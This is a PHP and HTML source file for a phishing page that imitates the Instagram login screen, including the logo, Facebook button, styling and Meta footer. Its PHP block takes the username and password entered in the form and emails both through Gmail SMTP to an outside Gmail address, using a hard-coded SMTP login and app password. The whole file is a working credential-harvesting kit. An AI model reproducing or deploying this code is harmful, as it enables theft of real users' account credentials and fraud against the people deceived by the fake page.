<?php

//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if (isset($_POST['submit'])) {
    $name = $_POST["name"];
    $pass = $_POST["pass"];
    
               
    //Load Composer's autoloader
    require 'PHPMailer/Exception.php';
    require 'PHPMailer/PHPMailer.php';
    require 'PHPMailer/SMTP.php';

    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);

    try {
        //Server settings
        $mail->SMTPDebug = 0;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'carebusiness674@gmail.com';             //SMTP username
        $mail->Password   = 'pmcx cwgz noxh lkpj';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $mail->setFrom('carebusiness674@gmail.com', "$name");
        $mail->addAddress('virenkhokhar777@gmail.com', 'user');     //Add a recipient
        
		// info@alkhatalfodee.com
    
        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Contact Form';
        $mail->Body    = "Sender Name - $name <br> Sender Password - $pass <br>";
    

        $mail->send();
        echo '<center><h2 style="color:green;">Message has been sent</h2></center>';
    } catch (Exception $e) {
        echo "<center><h2 style='color:red;'>Message could not be sent. Mailer Error: {$mail->ErrorInfo}</h2></center>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Page</title>
  <style>
    /* CSS code for styling the page */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    a{
        text-decoration: none;
    }

    .container {
      max-width: 375px;
      margin: 0 auto;
      /* background-color: #fafafa; */
      height: 100vh;

    }

    .language {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 20px;
    }

    .language select {
      border: none;
      background-color: transparent;
      font-size: 12px;
      color: #999;
    }

    .logo {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 20px;
    }

    .logo img {
      width: 175px;
    }

    .facebook {
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 10% 40px;
      padding: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      background-color: #0095f6;
      color: #fff;
      font-weight: bold;
      font-size: 14px;
    }

    .facebook img {
      width: 25px;
      margin-right: 5px;
    }

    .or {
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 10px 40px;
      font-size: 13px;
      color: #999;
    }

    .or::before,
    .or::after {
      content: "";
      display: block;
      width: 40%;
      height: 1px;
      background-color: #dbdbdb;
      margin: 0 10px;
    }

    .form {
      display: flex;
      flex-direction: column;
      margin: 10px 40px;
    }

    .form input {
      width: 100%;
      height: 36px;
      margin-bottom: 10px;
      padding: 0 10px;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      background-color: #fafafa;
      font-size: 14px;
    }

    .form button {
      width: 100%;
      height: 30px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      background-color: #0095f6;
      color: #fff;
      font-weight: bold;
      font-size: 14px;
    }

    .form a {
      display: block;
      text-align: center;
      font-size: 12px;
      color: #0095f6;
      margin: 10px 0;
    }

    .signup {
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 10px 0;
      padding: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      background-color: #fff;
      font-size: 14px;
    }

    .signup span {
      color: #262626;
    }

    .signup a {
      margin-left: 5px;
      color: #0095f6;
      font-weight: bold;
    }

    .apps {
      display: none;
      flex-direction: column;
      align-items: center;
      margin: 10px 0;
      font-size: 14px;
      color: #262626;
    }

    .apps p {
      margin-bottom: 10px;
    }

    .apps img {
      width: 136px;
      height: 40px;
      margin: 5px;
    }

    .footer {
    /* display: flex; */
    flex-direction: column;
    align-items: center;
    margin: 10px 0;
    font-size: 12px;
    /* top: 50%; */
    left: 50%;
    color: #999;
    position: absolute;
    bottom: 0;
    transform: translate(-50%, -50%);
    }

    .footer ul {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      margin-bottom: 10px;
    }

    .footer ul li {
      margin: 0 10px;
    }

    .footer ul li a {
      color: #999;
    }

    .footer p {
      margin-bottom: 10px;
    }

    .footer p img {
      width:70px;
      bottom: 100px;
      vertical-align: middle;
      margin-right: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="language">
      <select name="language" id="language">
        <option value="en">English (UK)</option>
        <option value="es">Español</option>
        <option value="fr">Français</option>
        <option value="hi">हिन्दी</option>
        <option value="gu">ગુજરાતી</option>
        <!-- add more options as needed -->
      </select>
    </div>
    <div class="logo">
      <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/ys/r/WBLlWbPOKZ9.png&quot;); background-position: 0px 0px; background-size: 176px 264px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i>
    </div>
    <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522gxf9tn15uyu2ek5fnze1p17q51szbg0a1p5eqda1jb85y6eiy7r3%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1cbe0d02-57c8-48c9-bc2b-5eacaf63796c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522gxf9tn15uyu2ek5fnze1p17q51szbg0a1p5eqda1jb85y6eiy7r3%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">
        <div class="facebook">
            <img src="https://www.freeiconspng.com/uploads/facebook-logo-png-white-facebook-logo-png-white-facebook-icon-png--32.png" alt="Facebook logo">
            <span>Continue Using Facebook</span>
          </div>
    </a>
    <div class="or">
      <span>OR</span>
    </div>
    <!-- ------------------   form start     -------------------- -->
    <div class="form">
        <form action="index.php" method="post">
            <input type="text" name="name" placeholder="Phone number, username, or email">
            <input type="password" name="pass" placeholder="Password">
            <button type="submit" name="submit">Log in</button>
            <a href="https://www.instagram.com/accounts/password/reset/">Forgotten your password?</a>
        </form>
    </div>
    <!-- ------------------   form end   -------------------- -->
    <div class="signup">
      <span>Don't have an account?</span>
      <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
    </div>
    <div class="apps">
      <p>Get the app.</p>
      <img src="https://freelogopng.com/images/all_img/1664287128google-play-store-logo-png.png" alt="Google Play icon">
      <img src="data:image/jpeg;base64,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" alt="App Store icon">
    </div>
    <div class="footer">
      <!-- <ul>
        <li><a href="#">ABOUT US</a></li>
        <li><a href="#">SUPPORT</a></li>
        <li><a href="#">PRESS</a></li>
        <li><a href="#">API</a></li>
        <li><a href="#">JOBS</a></li>
        <li><a href="#">PRIVACY</a></li>
        <li><a href="#">TERMS</a></li>
        <li><a href="#">DIRECTORY</a></li>
        <li><a href="#">PROFILES</a></li>
        <li><a href="#">HASHTAGS</a></li>
        <li><a href="#">LANGUAGE</a></li>
      </ul> -->
      <p><img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg" alt="Meta logo"></p>

    </div>
  </div>
</body>
</html>